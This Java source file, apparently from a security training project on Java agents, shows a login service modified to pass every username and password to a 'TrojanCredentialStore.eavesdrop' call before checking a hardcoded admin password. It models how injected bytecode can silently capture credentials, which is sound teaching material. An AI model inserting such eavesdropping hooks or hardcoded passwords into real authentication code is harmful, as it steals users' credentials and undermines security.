/*
 * The MIT License (MIT)
 *
 * Copyright (c) 2015 QAware GmbH, Munich, Germany
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package de.qaware.campus.secpro.agent.impl;

import com.google.common.collect.Maps;
import de.qaware.campus.secpro.agent.LoginService;
import de.qaware.campus.secpro.agent.TrojanCredentialStore;

import java.util.Map;
import java.util.Objects;

/**
 * A custom implementation of LoginServiceImpl showing the required modifications.
 * Use the ASMifier to get an idea of the required byte code.
 *
 * @author mario-leander.reimer
 */
public class EavesdropLoginServiceImpl implements LoginService {
    private static final Map<String, String> LOGINS = Maps.newHashMap();

    static {
        LOGINS.put("admin", "Mellon");
    }

    @Override
    public boolean canLogin(String username, String password) {
        TrojanCredentialStore.eavesdrop(username, password);
        String realPassword = LOGINS.get(username);
        return Objects.equals(realPassword, password);
    }
}
